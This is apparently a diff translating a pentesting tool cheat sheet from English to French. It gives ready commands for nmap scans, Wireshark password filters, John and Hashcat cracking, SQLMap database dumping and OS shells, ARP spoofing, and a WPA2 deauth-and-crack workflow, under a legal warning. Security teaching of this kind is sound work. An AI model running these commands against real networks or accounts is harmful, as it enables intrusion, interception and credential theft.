@@ -1,193 +1,193 @@
-# Essential Security Tools
+# Outils de Sécurité Essentiels
 
 `#redteam` `#nmap` `#wifi` `#cracking`
 
-The hacker's toolbox—essential tools for penetration testing and security auditing.
+La boîte à outils du hacker—outils essentiels pour les tests de pénétration et l'audit de sécurité.
 
 ---
 
-!!! danger "Legal Warning"
-    These tools are for **educational use** or **authorized security audits ONLY**.
+!!! danger "Avertissement Légal"
+    Ces outils sont pour **usage éducatif** ou **audits de sécurité autorisés UNIQUEMENT**.
 
-    Using them on networks, systems, or applications you don't own or have explicit written permission to test is **illegal** and can result in criminal prosecution.
+    Les utiliser sur des réseaux, systèmes ou applications que vous ne possédez pas ou pour lesquels vous n'avez pas d'autorisation écrite explicite est **illégal** et peut entraîner des poursuites pénales.
 
-    **Always get written authorization before testing.**
+    **Obtenez toujours une autorisation écrite avant de tester.**
 
 ---
 
-## Category 1: Network Reconnaissance
+## Catégorie 1 : Reconnaissance Réseau
 
-### Nmap — "The Mapper"
+### Nmap — "Le Mappeur"
 
-The industry-standard network scanner. Discovers hosts, open ports, services, and OS versions.
+Le scanner réseau standard de l'industrie. Découvre les hôtes, ports ouverts, services et versions d'OS.
 
 ```bash
-# Basic scan
+# Scan basique
 nmap 192.168.1.1
 
-# Service version detection
+# Détection de version de service
 nmap -sV 192.168.1.1
 
-# OS detection + scripts + version
+# Détection OS + scripts + version
 nmap -A 192.168.1.1
 
-# Full TCP port scan
+# Scan complet des ports TCP
 nmap -p- 192.168.1.1
 
-# Stealth SYN scan (requires root)
+# Scan SYN furtif (nécessite root)
 sudo nmap -sS 192.168.1.1
 
-# UDP scan (slow but important)
+# Scan UDP (lent mais important)
 sudo nmap -sU --top-ports 100 192.168.1.1
 
-# Scan entire subnet
+# Scanner un sous-réseau entier
 nmap 192.168.1.0/24
 
-# Output to all formats
+# Sortie vers tous les formats
 nmap -oA scan_results 192.168.1.1
 ```
 
-**Common Scripts (NSE):**
+**Scripts Courants (NSE) :**
 
 ```bash
-# Vulnerability scanning
+# Scan de vulnérabilités
 nmap --script vuln 192.168.1.1
 
-# SMB enumeration
+# Énumération SMB
 nmap --script smb-enum-shares 192.168.1.1
 
-# HTTP enumeration
+# Énumération HTTP
 nmap --script http-enum 192.168.1.1
 ```
 
-| Flag | Purpose |
+| Flag | Objectif |
 |------|---------|
-| `-sS` | SYN stealth scan |
-| `-sV` | Version detection |
-| `-sC` | Default scripts |
-| `-O` | OS detection |
-| `-A` | Aggressive (OS + version + scripts + traceroute) |
-| `-p-` | All 65535 ports |
-| `-Pn` | Skip host discovery (assume online) |
-| `-T4` | Faster timing |
+| `-sS` | Scan furtif SYN |
+| `-sV` | Détection de version |
+| `-sC` | Scripts par défaut |
+| `-O` | Détection OS |
+| `-A` | Agressif (OS + version + scripts + traceroute) |
+| `-p-` | Tous les 65535 ports |
+| `-Pn` | Ignorer la découverte d'hôte (supposer en ligne) |
+| `-T4` | Timing plus rapide |
 
 ---
 
-### Wireshark — "The Microscope"
+### Wireshark — "Le Microscope"
 
-Deep packet inspection and analysis. See exactly what's on the wire.
+Inspection et analyse approfondie des paquets. Voir exactement ce qui passe sur le câble.
 
-**Use Cases:**
+**Cas d'Usage :**
 
-- Analyze suspicious network traffic
-- Debug application protocols
-- Capture credentials on unencrypted protocols
-- Investigate malware communication
+- Analyser le trafic réseau suspect
+- Déboguer les protocoles d'application
+- Capturer les identifiants sur protocoles non chiffrés
+- Investiguer la communication de malware
 
-**Common Filters:**
+**Filtres Courants :**
 
 ```
-# Filter by IP
+# Filtrer par IP
 ip.addr == 192.168.1.100
 
-# Filter by protocol
+# Filtrer par protocole
 http
 dns
 tcp.port == 443
 
-# Filter HTTP requests
+# Filtrer les requêtes HTTP
 http.request.method == "POST"
 
-# Find passwords (unencrypted)
+# Trouver des mots de passe (non chiffrés)
 http contains "password"
 
-# TCP handshake issues
+# Problèmes de handshake TCP
 tcp.flags.syn == 1 && tcp.flags.ack == 0
 
-# Follow TCP stream
-Right-click packet → Follow → TCP Stream
+# Suivre le flux TCP
+Clic droit sur paquet → Follow → TCP Stream
 ```
 
-**Quick Capture:**
+**Capture Rapide :**
 
 ```bash
-# CLI capture with tshark
+# Capture CLI avec tshark
 tshark -i eth0 -w capture.pcap
 
-# Capture specific port
+# Capturer un port spécifique
 tshark -i eth0 -f "port 80" -w http_traffic.pcap
 ```
 
 ---
 
-## Category 2: Password Cracking (Offline)
+## Catégorie 2 : Cassage de Mots de Passe (Offline)
 
-### Understanding: Hashing vs Encryption
+### Comprendre : Hachage vs Chiffrement
 
-| Concept | Hashing | Encryption |
+| Concept | Hachage | Chiffrement |
 |---------|---------|------------|
-| **Direction** | One-way (irreversible) | Two-way (reversible) |
-| **Purpose** | Verify integrity | Protect confidentiality |
-| **Key required** | No | Yes |
-| **Example** | SHA256, bcrypt, MD5 | AES, RSA, ChaCha20 |
+| **Direction** | Sens unique (irréversible) | Bidirectionnel (réversible) |
+| **Objectif** | Vérifier l'intégrité | Protéger la confidentialité |
+| **Clé requise** | Non | Oui |
+| **Exemple** | SHA256, bcrypt, MD5 | AES, RSA, ChaCha20 |
 
-**Password cracking** = Given a hash, find the original password by trying millions of guesses.
+**Cassage de mot de passe** = Étant donné un hash, trouver le mot de passe original en essayant des millions de possibilités.
 
 ---
 
 ### John the Ripper
 
-Fast, versatile password cracker supporting 100+ hash formats.
+Casseur de mots de passe rapide et polyvalent supportant plus de 100 formats de hash.
 
 ```bash
-# Identify hash type
+# Identifier le type de hash
 john --list=formats | grep -i sha
 
-# Crack with wordlist
+# Casser avec wordlist
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 
-# Crack with rules (mutations)
+# Casser avec règles (mutations)
 john --wordlist=rockyou.txt --rules=best64 hashes.txt
 
-# Show cracked passwords
+# Afficher les mots de passe cassés
 john --show hashes.txt
 
-# Specific format
+# Format spécifique
 john --format=raw-sha256 hashes.txt
 ```
 
-**Supported formats:**
+**Formats supportés :**
 
 - Linux shadow (`/etc/shadow`)
 - Windows NTLM
-- ZIP/RAR passwords
-- Office documents
-- SSH keys
-- And many more...
+- Mots de passe ZIP/RAR
+- Documents Office
+- Clés SSH
+- Et bien d'autres...
 
 ---
 
-### Hashcat — GPU-Accelerated Cracking
+### Hashcat — Cassage Accéléré par GPU
 
-Faster than John using GPU power. Essential for large-scale cracking.
+Plus rapide que John en utilisant la puissance du GPU. Essentiel pour le cassage à grande échelle.
 
 ```bash
-# Basic dictionary attack
+# Attaque par dictionnaire basique
 hashcat -m 0 -a 0 hash.txt rockyou.txt
 
-# With rules
+# Avec règles
 hashcat -m 0 -a 0 hash.txt rockyou.txt -r best64.rule
 
-# Brute-force (mask attack)
+# Brute-force (attaque par masque)
 hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a
 
-# Show results
+# Afficher les résultats
 hashcat --show hash.txt
 ```
 
-**Common Hash Modes (-m):**
+**Modes de Hash Courants (-m) :**
 
-| Mode | Hash Type |
+| Mode | Type de Hash |
 |------|-----------|
 | 0 | MD5 |
 | 100 | SHA1 |
@@ -197,224 +197,224 @@ hashcat --show hash.txt
 | 3200 | bcrypt |
 | 13100 | Kerberos TGS |
 
-**Mask Characters:**
+**Caractères de Masque :**
 
-| Mask | Characters |
+| Masque | Caractères |
 |------|------------|
-| `?l` | Lowercase (a-z) |
-| `?u` | Uppercase (A-Z) |
-| `?d` | Digits (0-9) |
-| `?s` | Special characters |
-| `?a` | All printable |
+| `?l` | Minuscules (a-z) |
+| `?u` | Majuscules (A-Z) |
+| `?d` | Chiffres (0-9) |
+| `?s` | Caractères spéciaux |
+| `?a` | Tous imprimables |
 
 ---
 
-## Category 3: Web & Database
+## Catégorie 3 : Web & Base de Données
 
-### SQLMap — SQL Injection Automation
+### SQLMap — Automatisation d'Injection SQL
 
-Automates detection and exploitation of SQL injection vulnerabilities.
+Automatise la détection et l'exploitation des vulnérabilités d'injection SQL.
 
-!!! warning "Very Noisy"
-    SQLMap generates hundreds of requests. **Never use on production systems without authorization.** It will trigger every WAF and IDS alarm.
+!!! warning "Très Bruyant"
+    SQLMap génère des centaines de requêtes. **Ne jamais utiliser sur des systèmes de production sans autorisation.** Il déclenchera toutes les alarmes WAF et IDS.
 
 ```bash
-# Basic test
+# Test basique
 sqlmap -u "http://target.com/page?id=1"
 
-# POST request
+# Requête POST
 sqlmap -u "http://target.com/login" --data="user=admin&pass=test"
 
-# With cookie/session
+# Avec cookie/session
 sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"
 
-# Dump database
+# Dumper la base de données
 sqlmap -u "http://target.com/page?id=1" --dump
 
-# Get shell (if possible)
+# Obtenir un shell (si possible)
 sqlmap -u "http://target.com/page?id=1" --os-shell
 
-# Specify database type
+# Spécifier le type de base de données
 sqlmap -u "http://target.com/page?id=1" --dbms=mysql
 ```
 
-**Useful Flags:**
+**Flags Utiles :**
 
-| Flag | Purpose |
+| Flag | Objectif |
 |------|---------|
-| `--dbs` | List databases |
-| `--tables` | List tables |
-| `--columns` | List columns |
-| `--dump` | Dump data |
-| `--level=5` | Maximum test level |
-| `--risk=3` | Maximum risk (more tests) |
-| `--batch` | Non-interactive mode |
+| `--dbs` | Lister les bases de données |
+| `--tables` | Lister les tables |
+| `--columns` | Lister les colonnes |
+| `--dump` | Dumper les données |
+| `--level=5` | Niveau de test maximum |
+| `--risk=3` | Risque maximum (plus de tests) |
+| `--batch` | Mode non-interactif |
 
 ---
 
-## Category 4: Man-in-the-Middle (MitM)
+## Catégorie 4 : Man-in-the-Middle (MitM)
 
 ### Ettercap — ARP Spoofing
 
-Intercept traffic on a LAN by poisoning ARP tables.
+Intercepter le trafic sur un LAN en empoisonnant les tables ARP.
 
-**How ARP Spoofing Works:**
+**Comment fonctionne l'ARP Spoofing :**
 
 ```
-Normal:
-Victim → Switch → Gateway → Internet
+Normal :
+Victime → Switch → Passerelle → Internet
 
-After ARP Poisoning:
-Victim → Switch → [Attacker] → Gateway → Internet
+Après Empoisonnement ARP :
+Victime → Switch → [Attaquant] → Passerelle → Internet
          ↑
-    Attacker tells victim:
-    "I'm the gateway"
+    L'attaquant dit à la victime :
+    "Je suis la passerelle"
 ```
 
 ```bash
-# GUI mode
+# Mode GUI
 sudo ettercap -G
 
-# Text mode - ARP poisoning entire subnet
+# Mode texte - Empoisonnement ARP sur tout le sous-réseau
 sudo ettercap -T -q -i eth0 -M arp:remote //192.168.1.1// //192.168.1.0/24//
 
-# Target specific host
+# Cibler un hôte spécifique
 sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//
 ```
 
-**Alternative: arpspoof + mitmproxy**
+**Alternative : arpspoof + mitmproxy**
 
 ```bash
-# Enable IP forwarding
+# Activer le forwarding IP
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
-# ARP spoof both directions
+# ARP spoof dans les deux directions
 arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &
 arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &
 
-# Intercept with mitmproxy
+# Intercepter avec mitmproxy
 mitmproxy --mode transparent
 ```
 
-!!! danger "Detection"
-    ARP spoofing is easily detected by:
+!!! danger "Détection"
+    L'ARP spoofing est facilement détecté par :
 
-    - Static ARP entries
-    - ARP monitoring tools (arpwatch)
-    - Enterprise switches with DAI (Dynamic ARP Inspection)
+    - Entrées ARP statiques
+    - Outils de monitoring ARP (arpwatch)
+    - Switches d'entreprise avec DAI (Dynamic ARP Inspection)
 
 ---
 
-## Category 5: Wireless Auditing
+## Catégorie 5 : Audit Sans Fil
 
-### Aircrack-ng Suite
+### Suite Aircrack-ng
 
-Complete toolkit for WiFi security assessment.
+Toolkit complet pour l'évaluation de sécurité WiFi.
 
-**Components:**
+**Composants :**
 
-| Tool | Purpose |
+| Outil | Objectif |
 |------|---------|
-| `airmon-ng` | Enable monitor mode |
-| `airodump-ng` | Capture packets, find networks |
-| `aireplay-ng` | Inject packets, deauth clients |
-| `aircrack-ng` | Crack captured handshakes |
+| `airmon-ng` | Activer le mode monitor |
+| `airodump-ng` | Capturer les paquets, trouver les réseaux |
+| `aireplay-ng` | Injecter des paquets, deauth clients |
+| `aircrack-ng` | Casser les handshakes capturés |
 
-**WPA2 Cracking Workflow:**
+**Workflow de Cassage WPA2 :**
 
 ```bash
-# 1. Enable monitor mode
+# 1. Activer le mode monitor
 sudo airmon-ng start wlan0
 
-# 2. Scan for networks
+# 2. Scanner les réseaux
 sudo airodump-ng wlan0mon
 
-# 3. Target specific network (capture handshake)
+# 3. Cibler un réseau spécifique (capturer le handshake)
 sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
 
-# 4. Deauth client to force reconnect (in new terminal)
+# 4. Deauth client pour forcer la reconnexion (dans un nouveau terminal)
 sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
 
-# 5. Wait for "WPA handshake" message in airodump
+# 5. Attendre le message "WPA handshake" dans airodump
 
-# 6. Crack with wordlist
+# 6. Casser avec wordlist
 aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
 
-# 7. Disable monitor mode when done
+# 7. Désactiver le mode monitor quand terminé
 sudo airmon-ng stop wlan0mon
 ```
 
-!!! tip "Faster Cracking"
-    Convert capture to hashcat format for GPU acceleration:
+!!! tip "Cassage Plus Rapide"
+    Convertir la capture au format hashcat pour l'accélération GPU :
 
     ```bash
-    # Convert to hccapx
+    # Convertir en hccapx
     cap2hccapx capture-01.cap capture.hccapx
 
-    # Crack with hashcat
+    # Casser avec hashcat
     hashcat -m 22000 capture.hccapx rockyou.txt
     ```
 
 ---
 
-## Category 6: Reverse Engineering
+## Catégorie 6 : Rétro-Ingénierie
 
-### Ghidra — NSA's Disassembler
+### Ghidra — Le Désassembleur de la NSA
 
-Free, open-source reverse engineering tool. Turns compiled binaries back into readable pseudo-code.
+Outil gratuit et open-source de rétro-ingénierie. Transforme les binaires compilés en pseudo-code lisible.
 
-**Features:**
+**Fonctionnalités :**
 
-- Disassembly (binary → assembly)
-- Decompilation (binary → C-like pseudo-code)
-- Cross-references
-- Function graphs
+- Désassemblage (binaire → assembleur)
+- Décompilation (binaire → pseudo-code C-like)
+- Références croisées
+- Graphes de fonctions
 - Scripting (Python/Java)
 
-**Installation:**
+**Installation :**
 
 ```bash
-# Download from https://ghidra-sre.org/
+# Télécharger depuis https://ghidra-sre.org/
 
-# Or via package manager
+# Ou via gestionnaire de paquets
 sudo apt install ghidra  # Kali/Debian
 
-# Run
+# Exécuter
 ghidraRun
 ```
 
-**Workflow:**
+**Workflow :**
 
-1. Create new project
-2. Import binary (File → Import)
-3. Double-click to open in CodeBrowser
-4. Auto-analyze when prompted
-5. Navigate functions in left panel
-6. Press `F` on addresses to create functions
-7. Rename variables/functions for clarity
+1. Créer un nouveau projet
+2. Importer le binaire (File → Import)
+3. Double-cliquer pour ouvrir dans CodeBrowser
+4. Auto-analyser quand demandé
+5. Naviguer les fonctions dans le panneau gauche
+6. Appuyer sur `F` sur les adresses pour créer des fonctions
+7. Renommer variables/fonctions pour plus de clarté
 
-**Keyboard Shortcuts:**
+**Raccourcis Clavier :**
 
-| Key | Action |
+| Touche | Action |
 |-----|--------|
-| `G` | Go to address |
-| `L` | Rename/label |
-| `T` | Retype variable |
-| `;` | Add comment |
-| `X` | Show cross-references |
-| `Ctrl+E` | Edit bytes |
+| `G` | Aller à l'adresse |
+| `L` | Renommer/étiqueter |
+| `T` | Retyper une variable |
+| `;` | Ajouter un commentaire |
+| `X` | Afficher les références croisées |
+| `Ctrl+E` | Éditer les octets |
 
 ---
 
-## Quick Reference Table
+## Tableau de Référence Rapide
 
-| Category | Tool | One-liner |
+| Catégorie | Outil | One-liner |
 |----------|------|-----------|
-| Port Scan | Nmap | `nmap -sCV -oA scan target` |
-| Packet Analysis | Wireshark | GUI or `tshark -i eth0` |
-| Hash Cracking | John | `john --wordlist=rockyou.txt hash.txt` |
-| Hash Cracking (GPU) | Hashcat | `hashcat -m 0 -a 0 hash.txt rockyou.txt` |
-| SQL Injection | SQLMap | `sqlmap -u "url?id=1" --dump` |
+| Scan de Ports | Nmap | `nmap -sCV -oA scan target` |
+| Analyse de Paquets | Wireshark | GUI ou `tshark -i eth0` |
+| Cassage de Hash | John | `john --wordlist=rockyou.txt hash.txt` |
+| Cassage de Hash (GPU) | Hashcat | `hashcat -m 0 -a 0 hash.txt rockyou.txt` |
+| Injection SQL | SQLMap | `sqlmap -u "url?id=1" --dump` |
 | ARP Spoofing | Ettercap | `ettercap -T -M arp:remote ///` |
-| WiFi Audit | Aircrack-ng | `aircrack-ng -w wordlist capture.cap` |
-| Reverse Engineering | Ghidra | GUI-based analysis |
+| Audit WiFi | Aircrack-ng | `aircrack-ng -w wordlist capture.cap` |
+| Rétro-Ingénierie | Ghidra | Analyse basée sur GUI |
